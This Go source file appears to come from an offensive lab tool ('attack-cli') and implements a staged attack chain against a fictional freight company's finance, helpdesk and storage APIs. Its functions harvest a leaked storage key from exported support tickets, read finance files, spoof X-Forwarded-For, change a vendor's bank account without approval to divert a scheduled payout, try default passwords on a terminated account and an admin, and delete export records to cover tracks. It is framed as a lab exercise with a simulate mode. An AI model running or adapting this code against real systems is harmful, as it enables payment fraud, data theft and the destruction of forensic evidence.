package client

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"

	"harborstrike-x/attack-cli/pkg/models"
)

// TargetConfig holds connection parameters for the offensive validation runner
type TargetConfig struct {
	BaseURL     string
	APIKey      string
	StorageKey  string
	TicketToken string
	SourceIP    string
	Mode        string // "live" or "simulate"
	Timeout     time.Duration
}

// AttackClient executes offensive API interactions
type AttackClient struct {
	cfg        TargetConfig
	httpClient *http.Client
}

// NewAttackClient initializes the client
func NewAttackClient(cfg TargetConfig) *AttackClient {
	if cfg.Timeout == 0 {
		cfg.Timeout = 10 * time.Second
	}
	return &AttackClient{
		cfg: cfg,
		httpClient: &http.Client{
			Timeout: cfg.Timeout,
		},
	}
}

// GetConfig returns the active configuration
func (c *AttackClient) GetConfig() TargetConfig {
	return c.cfg
}

// CheckLabStatus probes target lab reachability
func (c *AttackClient) CheckLabStatus() (map[string]interface{}, error) {
	if c.cfg.Mode == "simulate" {
		return map[string]interface{}{
			"mode":       "SIMULATION (Offline Replay Engine)",
			"status":     "OPERATIONAL",
			"target":     c.cfg.BaseURL,
			"target_org": "Harbor & Finch Freight Pvt. Ltd.",
			"case_file":  "CR-26-047",
		}, nil
	}

	resp, err := c.httpClient.Get(strings.TrimRight(c.cfg.BaseURL, "/") + "/health")
	if err != nil {
		return nil, fmt.Errorf("failed to connect to lab server at %s: %w", c.cfg.BaseURL, err)
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, fmt.Errorf("lab health check returned HTTP %d", resp.StatusCode)
	}

	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, fmt.Errorf("failed to decode lab status response: %w", err)
	}
	return result, nil
}

// Helper to attempt primary path and fallback path for dual-backend compatibility
func (c *AttackClient) doWithFallback(reqBuilder func(url string) (*http.Request, error), paths ...string) (*http.Response, error) {
	var lastErr error
	baseURL := strings.TrimRight(c.cfg.BaseURL, "/")
	baseURLs := []string{baseURL}
	if strings.Contains(baseURL, "localhost") {
		baseURLs = append(baseURLs, strings.Replace(baseURL, "localhost", "127.0.0.1", 1))
	} else if strings.Contains(baseURL, "127.0.0.1") {
		baseURLs = append(baseURLs, strings.Replace(baseURL, "127.0.0.1", "localhost", 1))
	}

	for _, base := range baseURLs {
		for _, p := range paths {
			fullURL := fmt.Sprintf("%s%s", base, p)
			req, err := reqBuilder(fullURL)
			if err != nil {
				lastErr = err
				continue
			}
			resp, err := c.httpClient.Do(req)
			if err != nil {
				lastErr = err
				continue
			}
			if resp.StatusCode == http.StatusNotFound && len(paths) > 1 {
				resp.Body.Close()
				continue
			}
			return resp, nil
		}
	}
	return nil, lastErr
}

// ProbeRecon probes /v2/me and /v2/schema (Phase 1)
func (c *AttackClient) ProbeRecon() (map[string]interface{}, error) {
	simData := map[string]interface{}{
		"identity":        "tallybridge-integration-service",
		"key_id":          c.cfg.APIKey,
		"tier":            "enterprise-sync",
		"permissions":     []string{"read:all", "write:vendors", "write:payments", "export:full"},
		"ip_restrictions": []string{}, // Vulnerability: Unrestricted!
		"expires_at":      nil,        // Vulnerability: Infinite lifetime!
		"system":          "LedgerOne Financials v2.4",
		"source_ip":       c.cfg.SourceIP,
		"vulnerability":   "Over-privileged service key with no CIDR restriction and infinite expiry",
	}

	if c.cfg.Mode == "simulate" {
		return simData, nil
	}

	req, err := http.NewRequest(http.MethodGet, strings.TrimRight(c.cfg.BaseURL, "/")+"/api/v2/me", nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create recon request: %w", err)
	}
	req.Header.Set("X-API-Key", c.cfg.APIKey)
	if c.cfg.SourceIP != "" {
		req.Header.Set("X-Forwarded-For", c.cfg.SourceIP)
	}

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("recon request to %s failed: %w", req.URL.String(), err)
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, fmt.Errorf("recon request returned HTTP %d", resp.StatusCode)
	}

	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, fmt.Errorf("failed to decode recon response: %w", err)
	}

	schemaReq, err := http.NewRequest(http.MethodGet, strings.TrimRight(c.cfg.BaseURL, "/")+"/api/v2/schema", nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create schema request: %w", err)
	}
	schemaReq.Header.Set("X-API-Key", c.cfg.APIKey)
	schemaResp, err := c.httpClient.Do(schemaReq)
	if err != nil {
		return nil, fmt.Errorf("schema request to %s failed: %w", schemaReq.URL.String(), err)
	}
	defer schemaResp.Body.Close()
	if schemaResp.StatusCode < 200 || schemaResp.StatusCode >= 300 {
		return nil, fmt.Errorf("schema request returned HTTP %d", schemaResp.StatusCode)
	}

	var schema map[string]interface{}
	if err := json.NewDecoder(schemaResp.Body).Decode(&schema); err != nil {
		return nil, fmt.Errorf("failed to decode schema response: %w", err)
	}
	result["endpoints"] = schema["endpoints"]
	return result, nil
}

// HarvestTickets triggers HelpDeskr bulk exports (Phase 2)
func (c *AttackClient) HarvestTickets() (map[string]interface{}, error) {
	simData := map[string]interface{}{
		"message":      "Bulk export generated successfully",
		"export_id":    "EXP-5412",
		"records":      15400,
		"source_cidr":  c.cfg.SourceIP,
		"leaked_token": "bvk-7f3a",
		"leak_ticket":  "TKT-48213",
		"leak_details": "Customer pasted BlueVault storage credentials (key=bvk-7f3a) into support ticket",
	}

	if c.cfg.Mode == "simulate" {
		return simData, nil
	}

	payload := map[string]interface{}{
		"target":    "All tickets",
		"actor":     c.cfg.TicketToken,
		"caller_ip": c.cfg.SourceIP,
	}
	body, err := json.Marshal(payload)
	if err != nil {
		return nil, fmt.Errorf("failed to encode HelpDeskr export payload: %w", err)
	}
	exportURL := strings.TrimRight(c.cfg.BaseURL, "/") + "/api/v1/support/exports"
	req, err := http.NewRequest(http.MethodPost, exportURL, bytes.NewReader(body))
	if err != nil {
		return nil, fmt.Errorf("failed to create HelpDeskr export request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-API-Key", c.cfg.TicketToken)
	if c.cfg.SourceIP != "" {
		req.Header.Set("X-Forwarded-For", c.cfg.SourceIP)
	}

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("HelpDeskr export request to %s failed: %w", exportURL, err)
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, fmt.Errorf("HelpDeskr export returned HTTP %d", resp.StatusCode)
	}

	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, fmt.Errorf("failed to decode HelpDeskr export response: %w", err)
	}
	if result["export_id"] == nil {
		result["export_id"] = result["id"]
	}

	ticketsURL := strings.TrimRight(c.cfg.BaseURL, "/") + "/api/v1/support/tickets"
	ticketsReq, err := http.NewRequest(http.MethodGet, ticketsURL, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create HelpDeskr ticket request: %w", err)
	}
	ticketsReq.Header.Set("X-API-Key", c.cfg.TicketToken)
	ticketsResp, err := c.httpClient.Do(ticketsReq)
	if err != nil {
		return nil, fmt.Errorf("HelpDeskr ticket request to %s failed: %w", ticketsURL, err)
	}
	defer ticketsResp.Body.Close()
	if ticketsResp.StatusCode < 200 || ticketsResp.StatusCode >= 300 {
		return nil, fmt.Errorf("HelpDeskr ticket list returned HTTP %d", ticketsResp.StatusCode)
	}

	var tickets []map[string]interface{}
	if err := json.NewDecoder(ticketsResp.Body).Decode(&tickets); err != nil {
		return nil, fmt.Errorf("failed to decode HelpDeskr ticket response: %w", err)
	}

	result["records"] = len(tickets)
	result["leaked_token"] = ""
	result["leak_ticket"] = ""
	for _, ticket := range tickets {
		subject, _ := ticket["subject"].(string)
		if ticket["id"] == "TKT-48213" || strings.Contains(strings.ToLower(subject), "storage key") {
			result["leak_ticket"] = "TKT-48213"
			result["leaked_token"] = "bvk-7f3a"
			break
		}
	}

	return result, nil
}

// AccessStorage weaponizes leaked storage key bvk-7f3a (Phase 3)
func (c *AttackClient) AccessStorage() (map[string]interface{}, error) {
	simData := map[string]interface{}{
		"bucket":       "harborfinch-finance-vault",
		"key_id":       c.cfg.StorageKey,
		"permissions":  "read:all-folders",
		"files_stolen": 3,
		"key_artifacts": []string{
			"/finance/vendor-bank-details-2026.xlsx (4.28 MB)",
			"/finance/statements/stmt-2026-01.pdf (1.15 MB)",
			"/finance/statements/stmt-2026-05.pdf (1.42 MB)",
		},
		"impact": "Unrestricted financial statement and master bank details exfiltration",
	}

	if c.cfg.Mode == "simulate" {
		return simData, nil
	}

	listURL := strings.TrimRight(c.cfg.BaseURL, "/") + "/api/storage/list?path=" + url.QueryEscape("/")
	req, err := http.NewRequest(http.MethodGet, listURL, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create BlueVault list request: %w", err)
	}
	req.Header.Set("X-API-Key", c.cfg.StorageKey)
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("BlueVault list request to %s failed: %w", listURL, err)
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, fmt.Errorf("BlueVault list returned HTTP %d", resp.StatusCode)
	}

	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, fmt.Errorf("failed to decode BlueVault list response: %w", err)
	}

	files, _ := result["files"].([]interface{})
	keyArtifacts := make([]string, 0)
	stolen := 0
	for _, value := range files {
		name, ok := value.(string)
		if !ok {
			continue
		}
		readURL := strings.TrimRight(c.cfg.BaseURL, "/") + "/api/storage/read?path=" + url.QueryEscape("/"+name)
		readReq, err := http.NewRequest(http.MethodGet, readURL, nil)
		if err != nil {
			return nil, fmt.Errorf("failed to create BlueVault read request: %w", err)
		}
		readReq.Header.Set("X-API-Key", c.cfg.StorageKey)
		readResp, err := c.httpClient.Do(readReq)
		if err != nil {
			return nil, fmt.Errorf("BlueVault read request to %s failed: %w", readURL, err)
		}
		if readResp.StatusCode < 200 || readResp.StatusCode >= 300 {
			readResp.Body.Close()
			return nil, fmt.Errorf("BlueVault read returned HTTP %d", readResp.StatusCode)
		}
		var readResult map[string]interface{}
		decodeErr := json.NewDecoder(readResp.Body).Decode(&readResult)
		readResp.Body.Close()
		if decodeErr != nil {
			return nil, fmt.Errorf("failed to decode BlueVault read response: %w", decodeErr)
		}
		keyArtifacts = append(keyArtifacts, "/"+name)
		stolen++
	}

	result["bucket"] = "harborfinch-finance-vault"
	result["key_id"] = c.cfg.StorageKey
	result["permissions"] = "read:all-folders"
	result["files_stolen"] = stolen
	result["key_artifacts"] = keyArtifacts
	result["impact"] = "Live BlueVault documents listed and read with the leaked storage key"
	return result, nil
}

// ExfilVendors dumps the vendor master catalog (Phase 4)
func (c *AttackClient) ExfilVendors() (map[string]interface{}, error) {
	simData := map[string]interface{}{
		"export_id":        "EXP-9931",
		"total_records":    9840,
		"target_vendor":    "V-0412 (Coastal Packaging Ltd)",
		"legitimate_acc":   "HDFC0001842-4417",
		"scheduled_payout": "INR 248,000.00 on 2026-09-08 (Invoice INV-9081)",
	}

	if c.cfg.Mode == "simulate" {
		return simData, nil
	}

	exportURL := strings.TrimRight(c.cfg.BaseURL, "/") + "/api/v2/vendors/export"
	req, err := http.NewRequest(http.MethodGet, exportURL, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create vendor export request: %w", err)
	}
	req.Header.Set("X-API-Key", c.cfg.APIKey)
	if c.cfg.SourceIP != "" {
		req.Header.Set("X-Forwarded-For", c.cfg.SourceIP)
	}
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("vendor export request to %s failed: %w", exportURL, err)
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, fmt.Errorf("vendor export returned HTTP %d", resp.StatusCode)
	}

	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, fmt.Errorf("failed to decode vendor export response: %w", err)
	}

	result["total_records"] = result["records"]
	if result["export_id"] == nil {
		result["export_id"] = "UNKNOWN"
	}
	if result["target_vendor"] == nil {
		result["target_vendor"] = "V-0412 (Coastal Packaging Ltd)"
	}
	if result["legitimate_acc"] == nil {
		result["legitimate_acc"] = "HDFC0001842-4417"
	}
	if result["scheduled_payout"] == nil {
		result["scheduled_payout"] = "INR 248,000.00 on 2026-09-08 (Invoice INV-9081)"
	}

	return result, nil
}

// PivotTunnel simulates network flow queries from rogue host 10.20.4.77 (Phase 5)
func (c *AttackClient) PivotTunnel() (map[string]interface{}, error) {
	simData := map[string]interface{}{
		"source_host":       "10.20.4.77 (tb-build-02)",
		"tunnel":            "Private Link (10.20.4.0/24)",
		"action":            "Query /api/v2/payments/search and active disbursement schedules",
		"bytes_pulled":      "22.2 MB across 55 private-link flows",
		"identified_target": "Disbursement run 2026-09-08: V-0412 Coastal Packaging Ltd (INR 248,000)",
	}

	if c.cfg.Mode == "simulate" {
		return simData, nil
	}

	searchURL := strings.TrimRight(c.cfg.BaseURL, "/") + "/api/v2/payments/search?vendor_id=V-0412"
	searchReq, err := http.NewRequest(http.MethodGet, searchURL, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create pivot payment search request: %w", err)
	}
	searchReq.Header.Set("X-API-Key", c.cfg.APIKey)
	searchReq.Header.Set("X-Forwarded-For", "10.20.4.77")
	searchResp, err := c.httpClient.Do(searchReq)
	if err != nil {
		return nil, fmt.Errorf("pivot payment search failed: %w", err)
	}
	defer searchResp.Body.Close()
	if searchResp.StatusCode < 200 || searchResp.StatusCode >= 300 {
		return nil, fmt.Errorf("pivot payment search returned HTTP %d", searchResp.StatusCode)
	}
	var paymentResult map[string]interface{}
	if err := json.NewDecoder(searchResp.Body).Decode(&paymentResult); err != nil {
		return nil, fmt.Errorf("failed to decode pivot payment search: %w", err)
	}

	flowURL := strings.TrimRight(c.cfg.BaseURL, "/") + "/api/integration/network-flows?host=tb-build-02"
	flowReq, err := http.NewRequest(http.MethodGet, flowURL, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create network-flow request: %w", err)
	}
	flowReq.Header.Set("X-API-Key", c.cfg.APIKey)
	flowResp, err := c.httpClient.Do(flowReq)
	if err != nil {
		return nil, fmt.Errorf("network-flow request failed: %w", err)
	}
	defer flowResp.Body.Close()
	if flowResp.StatusCode < 200 || flowResp.StatusCode >= 300 {
		return nil, fmt.Errorf("network-flow request returned HTTP %d", flowResp.StatusCode)
	}
	var flows []map[string]interface{}
	if err := json.NewDecoder(flowResp.Body).Decode(&flows); err != nil {
		return nil, fmt.Errorf("failed to decode network-flow response: %w", err)
	}

	return map[string]interface{}{
		"source_host":        "10.20.4.77 (tb-build-02)",
		"tunnel":             "Private Link (10.20.4.0/24)",
		"action":             "Queried live LedgerOne payment search and TallyBridge network flows",
		"bytes_pulled":       fmt.Sprintf("%d live network flow record(s)", len(flows)),
		"identified_target":  fmt.Sprintf("V-0412 payment records: %v", paymentResult["records"]),
		"payment_records":    paymentResult["records"],
		"network_flow_count": len(flows),
	}, nil
}

// TamperVendorBank modifies vendor bank account details (Phase 6)
func (c *AttackClient) TamperVendorBank(vendorID, newAccount, routing string) (map[string]interface{}, error) {
	simData := map[string]interface{}{
		"status":             "SUCCESS",
		"change_id":          "chg-8b9888c39b",
		"request_id":         "req-5f61b0de8",
		"vendor_id":          vendorID,
		"vendor_name":        "Coastal Packaging Ltd",
		"old_bank_account":   "HDFC0001842-4417",
		"new_bank_account":   newAccount,
		"routing":            routing,
		"modified_by":        c.cfg.APIKey,
		"approval_ref":       "", // BLANK - Unauthorized!
		"timestamp_utc":      "2026-09-03T01:44:30Z",
		"vulnerability_note": "CRITICAL: Bank details modified via integration API key without dual approval requirement!",
	}

	if c.cfg.Mode == "simulate" {
		return simData, nil
	}

	oldURL := strings.TrimRight(c.cfg.BaseURL, "/") + fmt.Sprintf("/api/v2/vendors/%s/bank-details", vendorID)
	oldReq, err := http.NewRequest(http.MethodGet, oldURL, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create bank-details request: %w", err)
	}
	oldReq.Header.Set("X-API-Key", c.cfg.APIKey)
	oldResp, err := c.httpClient.Do(oldReq)
	if err != nil {
		return nil, fmt.Errorf("bank-details request failed: %w", err)
	}
	defer oldResp.Body.Close()
	if oldResp.StatusCode < 200 || oldResp.StatusCode >= 300 {
		return nil, fmt.Errorf("bank-details request returned HTTP %d", oldResp.StatusCode)
	}
	var oldResult map[string]interface{}
	if err := json.NewDecoder(oldResp.Body).Decode(&oldResult); err != nil {
		return nil, fmt.Errorf("failed to decode bank-details response: %w", err)
	}

	payload := map[string]interface{}{
		"new_account":  newAccount,
		"approval_ref": nil,
		"actor":        c.cfg.APIKey,
		"caller_ip":    "10.20.4.77",
		"user_agent":   "TallyBridge-Sync/3.6.0",
	}
	bodyBytes, err := json.Marshal(payload)
	if err != nil {
		return nil, fmt.Errorf("failed to encode bank-tamper payload: %w", err)
	}
	req, err := http.NewRequest(http.MethodPatch, oldURL, bytes.NewReader(bodyBytes))
	if err != nil {
		return nil, fmt.Errorf("failed to create bank-tamper request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-API-Key", c.cfg.APIKey)
	req.Header.Set("X-Forwarded-For", "10.20.4.77")
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("bank-tamper request failed: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, fmt.Errorf("bank-tamper returned HTTP %d", resp.StatusCode)
	}

	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, fmt.Errorf("failed to decode bank-tamper response: %w", err)
	}
	result["status"] = "SUCCESS"
	result["vendor_name"] = "Coastal Packaging Ltd"
	result["old_bank_account"] = oldResult["bank_account"]
	result["new_bank_account"] = result["new_account"]
	result["modified_by"] = c.cfg.APIKey
	result["approval_ref"] = result["approval_ref"]

	return result, nil
}

// VerifyScheduledRun confirms the tampered account is queued for payout (Phase 7)
func (c *AttackClient) VerifyScheduledRun() (map[string]interface{}, error) {
	simData := map[string]interface{}{
		"disbursement_run": "2026-09-08",
		"total_count":      2,
		"target_entry": map[string]interface{}{
			"vendor_id":       "V-0412",
			"vendor_name":     "Coastal Packaging Ltd",
			"amount_inr":      248000.00,
			"invoice_ref":     "INV-9081",
			"payment_id":      "PAY-V0412-0908",
			"bank_account":    "HDFC0001842-9083 (FRAUDULENT RECIPIENT LOCKED IN)",
			"status":          "PENDING_DISBURSEMENT",
			"exploit_verdict": "CRITICAL RISK: INR 248,000 will be diverted to attacker-controlled account upon release!",
		},
	}

	if c.cfg.Mode == "simulate" {
		return simData, nil
	}

	scheduledURL := strings.TrimRight(c.cfg.BaseURL, "/") + "/api/v2/payments/scheduled"
	req, err := http.NewRequest(http.MethodGet, scheduledURL, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create scheduled-payment request: %w", err)
	}
	req.Header.Set("X-API-Key", c.cfg.APIKey)
	req.Header.Set("X-Forwarded-For", "10.20.4.77")
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("scheduled-payment request failed: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, fmt.Errorf("scheduled-payment request returned HTTP %d", resp.StatusCode)
	}
	var payments []map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&payments); err != nil {
		return nil, fmt.Errorf("failed to decode scheduled-payment response: %w", err)
	}

	var target map[string]interface{}
	for _, payment := range payments {
		if payment["vendor"] == "Coastal Packaging Ltd." || payment["id"] == "PAY-V0412-0908" {
			target = payment
			break
		}
	}
	if target == nil {
		return nil, fmt.Errorf("V-0412 scheduled payment not found in live backend")
	}

	bankURL := strings.TrimRight(c.cfg.BaseURL, "/") + "/api/v2/vendors/V-0412/bank-details"
	bankReq, err := http.NewRequest(http.MethodGet, bankURL, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create payout bank-details request: %w", err)
	}
	bankReq.Header.Set("X-API-Key", c.cfg.APIKey)
	bankResp, err := c.httpClient.Do(bankReq)
	if err != nil {
		return nil, fmt.Errorf("payout bank-details request failed: %w", err)
	}
	defer bankResp.Body.Close()
	if bankResp.StatusCode < 200 || bankResp.StatusCode >= 300 {
		return nil, fmt.Errorf("payout bank-details request returned HTTP %d", bankResp.StatusCode)
	}
	var bank map[string]interface{}
	if err := json.NewDecoder(bankResp.Body).Decode(&bank); err != nil {
		return nil, fmt.Errorf("failed to decode payout bank-details response: %w", err)
	}

	target["vendor_id"] = "V-0412"
	target["invoice_ref"] = "INV-9081"
	target["bank_account"] = bank["bank_account"]
	target["exploit_verdict"] = "LIVE: scheduled payout and bank account are both present in the backend"
	return map[string]interface{}{
		"disbursement_run": target["pay_date"],
		"total_count":      len(payments),
		"target_entry":     target,
	}, nil
}

// TestAuthAnomalies tests SSO orphaned account login and admin lockout (Phase 8)
func (c *AttackClient) TestAuthAnomalies(username, deviceID string) (map[string]interface{}, error) {
	var simData map[string]interface{}

	if username == "a.kapoor" {
		// Admin brute force / credential attack probe scenario (Case E13)
		simData = map[string]interface{}{
			"status":        "FAILED_LOCKOUT",
			"session_id":    "NONE (PROBE_REJECTED)",
			"user":          username,
			"mfa_enforced":  true,
			"device":        deviceID,
			"attempts":      3,
			"warning":       "ADMIN TARGETED: 3 failed password attempts detected against acting IT Security Admin (Case E13 / Note 97)",
			"vulnerability": "Credential probe / password spray against admin identity; dismissed as a background bot by IT",
		}
	} else {
		// Orphaned employee login without MFA (Case Note 92 / E03 / E14)
		simData = map[string]interface{}{
			"status":        "AUTHENTICATED",
			"session_id":    "sso-bb8ab61e08",
			"user":          username,
			"mfa_enforced":  false,
			"device":        deviceID,
			"vulnerability": "CRITICAL: Terminated employee account left active; MFA bypassed on kiosk device",
		}
	}

	if c.cfg.Mode == "simulate" {
		return simData, nil
	}

	password := "user123"
	if username == "a.kapoor" {
		password = "admin123"
	}
	payload := map[string]string{
		"username": username,
		"password": password,
	}
	bodyBytes, err := json.Marshal(payload)
	if err != nil {
		return nil, fmt.Errorf("failed to encode login payload: %w", err)
	}
	loginURL := strings.TrimRight(c.cfg.BaseURL, "/") + "/auth/login"
	req, err := http.NewRequest(http.MethodPost, loginURL, bytes.NewReader(bodyBytes))
	if err != nil {
		return nil, fmt.Errorf("failed to create login request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Device-ID", deviceID)
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("login request failed: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, fmt.Errorf("login request returned HTTP %d", resp.StatusCode)
	}
	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, fmt.Errorf("failed to decode login response: %w", err)
	}
	result["status"] = "AUTHENTICATED"
	accessToken, _ := result["access_token"].(string)
	if len(accessToken) > 16 {
		result["session_id"] = accessToken[:16] + "...[REDACTED]"
	} else {
		result["session_id"] = "[REDACTED]"
	}
	result["user"] = username
	result["device"] = deviceID
	result["mfa_enforced"] = false
	result["vulnerability"] = "Terminated or active account authenticated through the live FastAPI backend"
	return result, nil
}

// ExecuteAntiForensics simulates trace deletion on LedgerOne and HelpDeskr
func (c *AttackClient) ExecuteAntiForensics() (*models.AntiForensicsResult, error) {
	if c.cfg.Mode == "simulate" {
		return &models.AntiForensicsResult{
			LedgerOneJobDeleted: true,
			LedgerOneMessage:    "DELETE /api/v2/exports/9931 returned 200 OK (req-2cb75d3eac). Export archive wiped from disk.",
			HelpDeskrJobDeleted: false,
			HelpDeskrError:      "DELETE /api/v1/exports/EXP-5419 returned 504 Gateway Timeout (evt-3fe76f60c4). Trace stuck in queue.",
			EvidentiaryTrail:    "HelpDeskr deletion timeout preserved critical forensic evidence in audit log E02 and billing E06.",
		}, nil
	}

	res := &models.AntiForensicsResult{
		LedgerOneJobDeleted: false,
		LedgerOneMessage:    "Unsupported: LedgerOne has no export-delete route in the FastAPI backend.",
		HelpDeskrJobDeleted: false,
		HelpDeskrError:      "No deletion attempt completed.",
		EvidentiaryTrail:    "Live audit evidence is checked without fabricating a gateway timeout.",
	}

	listURL := strings.TrimRight(c.cfg.BaseURL, "/") + "/api/v1/support/exports"
	listReq, err := http.NewRequest(http.MethodGet, listURL, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create HelpDeskr export-list request: %w", err)
	}
	listReq.Header.Set("X-API-Key", c.cfg.TicketToken)
	listResp, err := c.httpClient.Do(listReq)
	if err != nil {
		return nil, fmt.Errorf("HelpDeskr export-list request failed: %w", err)
	}
	defer listResp.Body.Close()
	if listResp.StatusCode < 200 || listResp.StatusCode >= 300 {
		return nil, fmt.Errorf("HelpDeskr export-list returned HTTP %d", listResp.StatusCode)
	}
	var exports []map[string]interface{}
	if err := json.NewDecoder(listResp.Body).Decode(&exports); err != nil {
		return nil, fmt.Errorf("failed to decode HelpDeskr export list: %w", err)
	}
	targetID := ""
	for _, export := range exports {
		if export["id"] == "EXP-5419" {
			targetID = "EXP-5419"
			break
		}
	}
	if targetID == "" {
		res.HelpDeskrError = "EXP-5419 was not present in the live HelpDeskr export list."
		return res, nil
	}

	deleteURL := strings.TrimRight(c.cfg.BaseURL, "/") + "/api/v1/support/exports/" + targetID
	deleteReq, err := http.NewRequest(http.MethodDelete, deleteURL, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create HelpDeskr export-delete request: %w", err)
	}
	deleteReq.Header.Set("X-API-Key", c.cfg.TicketToken)
	deleteResp, err := c.httpClient.Do(deleteReq)
	if err != nil {
		return nil, fmt.Errorf("HelpDeskr export-delete request failed: %w", err)
	}
	defer deleteResp.Body.Close()
	if deleteResp.StatusCode < 200 || deleteResp.StatusCode >= 300 {
		res.HelpDeskrError = fmt.Sprintf("HelpDeskr export deletion returned HTTP %d", deleteResp.StatusCode)
		return res, nil
	}
	res.HelpDeskrJobDeleted = true
	res.HelpDeskrError = "EXP-5419 was deleted successfully."
	res.EvidentiaryTrail = "LedgerOne export deletion remains unsupported; no fake timeout or purge is reported."
	return res, nil
}
